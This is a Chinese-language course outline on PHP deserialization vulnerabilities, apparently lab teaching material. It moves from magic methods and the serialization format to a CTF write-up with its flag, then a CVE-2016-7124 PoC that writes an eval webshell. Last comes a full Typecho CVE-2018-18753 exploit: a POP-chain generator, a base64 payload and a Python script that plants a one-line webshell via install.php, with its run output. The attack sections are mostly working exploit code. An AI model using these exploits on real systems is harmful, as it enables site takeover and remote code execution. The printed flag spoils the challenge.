# 课程大纲

1. PHP类与对象 
2. PHP Magic函数 
3. PHP序列化与反序列化
4. 反序列化漏洞的出现 
5. CTF题目分析 
6. Typecho反序列化漏洞 
7. PHP反序列化漏洞防御

# PHP类与对象

## 类Class

一个共享相同结构和行为的对象的集合

![image-20221126155421686](https://image.201068.xyz/assets/image-20221126155421686.png)

## 对象Object

类的实例

![image-20221126155454378](https://image.201068.xyz/assets/image-20221126155454378.png)

# Magic函数

## Magic Methods 魔术方法

https://www.php.net/__sleep 

```
__construct()， __destruct() 
__call()， __callStatic() 
__get()， __set()
__isset()， __unset() 
__sleep()， __wakeup() 
__serialize(), __unserialize() 
__toString(), __invoke() 
__set_state(), __clone() 
__debugInfo()
```

## 函数作用

| 函数            | 作用                                          |
| --------------- | --------------------------------------------- |
| __construct     | 当一个**对象创建**时被调用                    |
| __destruct      | 当一个**对象销毁**时被调用                    |
| __toString      | 当一个**对象被当作一个字符串**使用            |
| __sleep         | 在对象被序列化**之前**运行                    |
| __wakeup        | 在对象被反序列化**之后**被调用                |
| __serialize()   | 对对象调用**serialize()**方法，PHP 7.4.0 起   |
| __unserialize() | 对对象调用**unserialize()**方法，PHP 7.4.0 起 |
| __call()        | 在对象上下文中调用不可访问的方法时触发        |
| __callStatic()  | 在静态上下文中调用不可访问的方法时触发        |
| __get()         | 用于从不可访问的属性读取数据                  |
| __set()         | 用于将数据写入不可访问的属性                  |
| __isset()       | 在不可访问的属性上调用isset()或empty()触发    |
| __unset()       | 在不可访问的属性上使用unset()时触发           |
| __invoke()      | 当脚本尝试将对象调用为函数时触发              |

# PHP序列化和反序列化

## 序列化和反序列化

![image-20221126160218582](https://image.201068.xyz/assets/image-20221126160218582.png)

## 类型序列化

| 类型    | 格式                                                         |
| ------- | ------------------------------------------------------------ |
| String  | s:size:value;                                                |
| Integer | i:value;                                                     |
| Boolean | b:value;(保存1或0)                                           |
| Null    | N;                                                           |
| Array   | a:size:{key definition;value definition;(repeated per element)} |
| Object  | O:strlen(object name):object name : object  size:{s:strlen(property name):property name:property definition;(repeated per property)} |

## 其他序列化格式        

json字符串 `json_encode`

 xml字符串 `wddx_serialize_value` 

二进制格式 

字节数组

## 反序列化：注意

1、如果传递的字符串不可以序列化，则返回 FALSE 

2、如果对象没有预定义，反序列化得到的对象是 

__PHP_Incomplete_Class

## 作用

1、传输对象

2、用作缓存（Cookie、Session）

## 反序列化与Maigc函数

`__wakeup` 

`__unserialize（7.4.0）` 

如果类中同时定义了 `__unserialize()` 和 `__wakeup()` 两个魔术方法，则只有 `__unserialize()` 方法会生效，`__wakeup()` 方法会被忽略。

# 反序列化的出现

## 反序列化漏洞 

### logfile.php

```php
<?php
/**
 * Class logfile
 * 功能说明：临时记录日志到error.log文件
 * __destruct被调用的时候，删除 error.log 文件
 */
class logfile
{
    //log文件名
    public $filename = 'error.log';
    //一些用于储存日志的代码
    public function logdata($text)
    {
        echo 'log data:'.$text.'<br />';
        file_put_contents($this->filename,$text,FILE_APPEND);
    }

    //destrcuctor 删除日志文件
    public function __destruct()
    {
        echo '__destruct deletes '.$this->filename.' file.<br />';
        unlink(dirname(__FILE__).'/'.$this->filename);
    }
}
?>
```



1. 记录日志：file_put_contents() 
2. 类销毁的时候，删除这个日志文件：__destruct()、unlink() 
3. 日志文件的名字通过filename指定



### request.php 利用

```php
<?php
/**
 * 引用了 logfile文件，包含__destruct方法
 *
 */
include 'logfile.php';
class User
{
    //类数据
    public $age = 0;
    public $name = '';
    //输出数据
    public function printdata()
    {
        echo 'User '.$this->name.' is'.$this->age.' years old.<br />';
    }
}
// 通过GET请求参数传入字符
// 此处可以反序列化任意对象
$usr = unserialize($_GET['param']);
?>
```



1. unserialize通过GET传输反序列化字符串 
2. 替换了字符串的filename值，比如index.php 
3. 导致当前目录index.php被删除 
4. 可以删除任意文件

### 小结

1. unserialize函数的**参数可控**，比如通过GET请求传参（漏洞触发点） 
2. 脚本中定义了**有Magic方法**，方法里面有向php文件做读写数据或者**执行命令的操作**，比如__destruct()、unlink() 
3. 操作的内容需要有对象中的成员**变量的值**，比如 filename

## 常见利用函数

| 类别     | 函数                                                |
| -------- | --------------------------------------------------- |
| 命令执行 | exec() passthru() popen() system() ……               |
| 文件操作 | file_put_contents() file_get_contents() unlink() …… |

## 利用方式

序列化一个对象 ，修改成员变量的值，达到操作其他 文件或者执行命令的目的

# CTF题目分析

## 题目地址

### 攻防世界：unserialize3

https://adworld.xctf.org.cn/challenges/details?hash=1013364e-31aa-4643-8322-e126f12c1b82_2&task_category_id=3



http://61.147.171.105:53418

```c++
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```

### CVE-2016-7124示例

cve7124.php

```php
<?php
// 目标：反序列化的时候绕过__wakeup以达到写文件的操作
// CVE-2016-7124
// PHP5小于5.6.25或PHP7小于7.0.10
class Test
{
    // 私有成员变量
    private $poc = '';
    public function __construct($poc)
    {
        $this->poc = $poc;
    }

    function __destruct()
    {
        if ($this->poc != '')
        {
            file_put_contents('shell.php', '<?php eval($_POST["shell"]);?>');
           die('Success!!!');
       }
        else
        {
            die('fail to getshell!!!');
        }
    }

    function __wakeup()
    {
        // 返回由对象属性组成的关联数组，把所有的属性置空
        foreach(get_object_vars($this) as $k => $v)
        {
            $this->$k = null;
        }
        echo "waking up...n";
    }
}
$poc = $_GET['poc'];
/*if(!isset($poc))
{
    show_source(__FILE__);
    die();
}*/
print_r("your payload:".$poc);
$a = unserialize($poc);
// PHP5小于5.6.25或PHP7小于7.0.10
```

poc.php

```php
<?php
// PHP5小于5.6.25或PHP7小于7.0.10
class Test
{
    private $poc = '';
    public function __construct($poc)
    {
        $this->poc = $poc;
    }
    function __destruct()
    {
        if ($this->poc != '')
        {
            file_put_contents('shell.php', '<?php eval($_POST["shell"]);?>');
                die('Success!!!');
            }
        else
        {
            die('fail to getshell!!!');
        }
    }
    function __wakeup()
    {
        foreach(get_object_vars($this) as $k => $v)
        {
            $this->$k = null;
        }
        echo "waking up...n";
    }
}
$a = new Test('shell');
$poc = serialize($a);
print($poc);
// PHP5小于5.6.25或PHP7小于7.0.10
// 1改为大于1的数字
// 将Testpoc改为%00Test%00poc
// O:4:"Test":2:{s:9:"%00Test%00poc";s:5:"shell";}
```

### 构造序列化

```php
<?php

class xctf{
    public $flag = '111';
}
$a = new xctf();
echo serialize($a);
// O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

payload

`http://61.147.171.105:53418/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

the answer is : cyberpeace{01ac23bddb1dc4962e5a3fa5a6853627}



cyberpeace{01ac23bddb1dc4962e5a3fa5a6853627}

# typecho反序列化漏洞分析

## 题目地址

### CVE-2018-18753

http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18753 

### typecho下载地址

https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release 

PHP版本：5.4.5nts （PHPStudy） 

在数据库新建一个库，命名为typecho

### type-poc.php

```php
<?php
class Typecho_Feed
{
    const RSS1 = 'RSS 1.0';
    const RSS2 = 'RSS 2.0';
    const ATOM1 = 'ATOM 1.0';
    const DATE_RFC822 = 'r';
    const DATE_W3CDTF = 'c';
    const EOL = "\n";
    private $_type;
    private $_items;

    public function __construct(){
        $this->_type = $this::RSS2;
        $this->_items[0] = array(
            'title' => '1',
            'link' => '1',
            'date' => 1508895132,
            'category' => array(new Typecho_Request()),
            'author' => new Typecho_Request(),
        );
    }
}
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();
    public function __construct(){
        $this->_params['screenName'] = 'phpinfo()';    //替换phpinfo()这里进行深度利用
        $this->_filter[0] = 'assert';
    }
}

$exp = array(
    'adapter' => new Typecho_Feed(),
    'prefix' => 'typecho_'
);

echo base64_encode(serialize($exp));
?>
//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=
```

将文件加入他typecho里

访问：http://192.168.31.193:8095/type-poc.php

得到pyload

![image-20221126203439904](https://image.201068.xyz/assets/image-20221126203439904.png)

访问：

http://192.168.31.193:8095/install.php?finish=%20HTTP/1.1

使用hackbar插件

![image-20221126204151988](https://image.201068.xyz/assets/image-20221126204151988.png)

![image-20221126204513999](https://image.201068.xyz/assets/image-20221126204513999.png)

### type-poc.py

作用：在当前网页上生成一句话木马

```php
import requests 
import sys 
url = "http://192.168.31.193:8095/install.php?finish="
payload = "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9" 
postData = {"__typecho_config":payload} 
header ={ 
	"Referer":url, 
	"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"} 
	
print(url) 
res = requests.get(url) 
if res.status_code == 200: 
	print("[+] install.php exist!") 
else: 
	print("[-] install.php not exist") 
	sys.exit() 
	
res = requests.post(url = url,data = postData,headers = header) 
res = requests.get(url+"shell.php") 
if res.status_code == 200: 
	print("[+] Shell.php write success!") 
	print("Shell path :",url+"shell.php") 
else: 
	print("[-] GetShell Error!")
```

### 运行type-poc.py

```
┌──(root㉿guoyx)-[/home/kali]
└─# python3 type-poc.py   
http://192.168.31.193:8095/install.php?finish=
[+] install.php exist!
[+] Shell.php write success!
Shell path : http://192.168.31.193:8095/install.php?finish=shell.php

```



生成一句话木马成功，使用蚁剑链接

http://192.168.31.193:8095/shell.php

![image-20221126205327772](https://image.201068.xyz/assets/image-20221126205327772.png)

![image-20221126205616002](https://image.201068.xyz/assets/image-20221126205616002.png)

连接成功

这个漏洞主要源自typecho安装程序install.php里有`unserialize`反序列化漏洞...

![屏幕截图 2022-11-26 210739](https://image.201068.xyz/assets/屏幕截图 2022-11-26 210739.png)

# 反序列化漏洞修复和防御

## 防御

针对unserialize和Magic函数审计 

对用户输入的内容过滤 

白名单，限制反序列化的类；不能动态传参